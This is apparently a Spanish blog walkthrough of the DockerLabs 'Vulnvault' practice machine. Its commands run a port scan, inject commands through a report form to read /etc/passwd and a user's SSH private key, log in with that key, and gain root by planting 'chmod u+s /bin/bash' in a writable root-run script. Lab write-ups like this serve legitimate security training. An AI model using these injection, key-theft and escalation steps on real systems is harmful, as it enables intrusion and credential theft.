---
layout: post
title: "Vulnvault"
date: 2024-11-05
 14:00:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Vulnvault </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Descubriendo puertos abiertos de la maquina objetivo.

`sudo nmap -p- -sS --open -T5 --min-rate=5000 -n -Pn -sCV 172.17.0.2`

![img](/notas/public/img/dockerlabs/vulnvault/nmap.png){:.margin}

**2\.** Revisamos la web, tenemos un formulario para generar reportes y otra para subir archivos; haciendo fuzzing podemos encontrar unos cuantos mas pero nada que ver, sin vectores de entrada.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/vulnvault/80.png){:.margin}

**3\.** El nombre tanto como la fecha ingresada en el formulario se refleja por debajo al generar el reporte; ingresamos un comando y vemos que tenemos ejecucion remota de comandos.  

`; id`

![img](/notas/public/img/dockerlabs/vulnvault/80reporte.png){:.margin}
![img](/notas/public/img/dockerlabs/vulnvault/80comando.png){:.margin}

**4\.** Leemos el passwd para ver los usuarios del sistema, encontramos el usuario samara. 

`; cat /etc/passwd`

![img](/notas/public/img/dockerlabs/vulnvault/passwd.png){:.margin}

**5\.** Ya sabiendo el usuario leemos su idrsa, nos copiamos toda la clave.

`; cat /home/samara/.ssh/id_rsa`

![img](/notas/public/img/dockerlabs/vulnvault/idrsa.png){:.margin}

**6\.** Lo guardamos en un fichero, le damos los permisos al idrsa y nos conectamos por ssh.

`nano id_rsa`

`chmod 600 id_rsa`

`ssh -i id_rsa samara@172.17.0.2`

![img](/notas/public/img/dockerlabs/vulnvault/sshsamara.png){:.margin}

**7\.** No tenemos binarios SUID, encuentro unos ficheros pero sin mas.

`cat message.txt`

`cat user.txt`

![img](/notas/public/img/dockerlabs/vulnvault/txts.png){:.margin}

**8\.** Vemos los procesos y nos encontramos que root ejecuta un script que crea el fichero message.txt; revisamos los permisos de echo.sh, podemos escribir en el fichero; hacemos que root convierta la bash en binario SUID; por ultimo ejecutamos la bash manteniendo los privilegios de root.

`ps -aux`

`cat /usr/local/bin/echo.sh`

`ls -l !$`

`echo "chmod u+s /bin/bash" > !$`

`bash -p`

![img](/notas/public/img/dockerlabs/vulnvault/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>